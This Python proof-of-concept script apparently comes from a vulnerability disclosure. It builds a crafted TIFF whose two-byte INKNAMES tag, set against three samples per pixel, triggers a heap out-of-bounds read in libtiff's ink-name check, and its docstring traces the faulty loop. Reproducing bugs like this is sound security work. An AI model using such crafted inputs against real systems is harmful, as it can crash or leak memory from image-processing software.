#!/usr/bin/env python3
"""
VULN 001: Heap OOB Read in checkInkNamesString via Crafted INKNAMES Tag
CWE-125 (Out-of-bounds Read)

Trigger path: tiffsplit -> TIFFOpen -> TIFFReadDirectory ->
              TIFFSetField(TIFFTAG_INKNAMES) -> checkInkNamesString()

Trigger condition:
  - TIFFTAG_SAMPLESPERPIXEL = 3 (N >= 3)
  - TIFFTAG_INKNAMES = "ab" (2 bytes, no internal null terminator, slen=2)
  - libtiff appends a sentinel '\0' at s[2], so allocation is 3 bytes: s[0]='a', s[1]='b', s[2]='\0'
  - ep = s + 2
  - i=0 (first name): reads s[0]='a', s[1]='b', then reads *ep=s[2]='\0' -> exits inner loop
    WITHOUT triggering the boundary check (check is AFTER the read)
  - cp++ -> cp = s+3 (ep+1, one past end of allocation)
  - i=1 (second name): reads *(s+3) -> HEAP OOB READ
"""
import struct
import os

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001.tif")

def pack_ifd_entry(tag, type_, count, value):
    """Pack a 12-byte IFD entry: tag(2) type(2) count(4) value_or_offset(4)."""
    return struct.pack("<HHII", tag, type_, count, value)

# TIFF layout (little-endian):
# Offset 0:  TIFF header (8 bytes): magic=0x4949, version=42, IFD offset
# Offset 8:  IFD (2 + N*12 + 4 bytes)
# After IFD: pixel data (3 bytes)

N_ENTRIES = 10
IFD_OFFSET = 8
IFD_SIZE = 2 + N_ENTRIES * 12 + 4  # 2 (count) + entries + 4 (next IFD ptr)
DATA_OFFSET = IFD_OFFSET + IFD_SIZE  # offset for pixel data

PIXEL_DATA = b'\x00' * 3  # 1 pixel x 3 samples x 1 byte = 3 bytes

# INKNAMES = "ab" (2 bytes, no null terminator in raw data)
# slen=2, so libtiff allocates 3 bytes and appends sentinel '\0' at position 2
# Since count=2 <= 4 bytes, we can store inline in the value_or_offset field
# Stored as "ab\x00\x00" (padded to 4 bytes for the IFD field)
INKNAMES_INLINE = struct.unpack("<I", b'ab\x00\x00')[0]

# IFD entries sorted by tag number (required by TIFF spec)
entries = [
    pack_ifd_entry(0x0100, 3, 1, 1),              # ImageWidth = 1 (SHORT=3)
    pack_ifd_entry(0x0101, 3, 1, 1),              # ImageLength = 1 (SHORT=3)
    pack_ifd_entry(0x0102, 3, 1, 8),              # BitsPerSample = 8 (SHORT=3)
    pack_ifd_entry(0x0103, 3, 1, 1),              # Compression = 1 (none, SHORT=3)
    pack_ifd_entry(0x0106, 3, 1, 5),              # PhotometricInterpretation = 5 (Separated/CMYK)
    pack_ifd_entry(0x0111, 4, 1, DATA_OFFSET),    # StripOffsets = DATA_OFFSET (LONG=4)
    pack_ifd_entry(0x0115, 3, 1, 3),              # SamplesPerPixel = 3 (SHORT=3)
    pack_ifd_entry(0x0116, 3, 1, 1),              # RowsPerStrip = 1 (SHORT=3)
    pack_ifd_entry(0x0117, 4, 1, 3),              # StripByteCounts = 3 (LONG=4)
    pack_ifd_entry(0x014D, 2, 2, INKNAMES_INLINE), # INKNAMES = "ab" (ASCII=2, count=2, inline)
]

assert len(entries) == N_ENTRIES

ifd_data = struct.pack("<H", N_ENTRIES)  # entry count
for e in entries:
    ifd_data += e
ifd_data += struct.pack("<I", 0)  # next IFD offset = 0 (no more IFDs)

# TIFF header: byte order (LE=0x4949), version (42=0x002A), IFD offset
header = struct.pack("<HHI", 0x4949, 0x002A, IFD_OFFSET)

tiff_data = header + ifd_data + PIXEL_DATA

with open(OUT, "wb") as f:
    f.write(tiff_data)

print(f"Written {len(tiff_data)} bytes to {OUT}")
print(f"  IFD at offset {IFD_OFFSET}, pixel data at offset {DATA_OFFSET}")
print(f"  SamplesPerPixel=3, INKNAMES='ab' (slen=2) -> expects 3 names, finds <1 -> OOB")
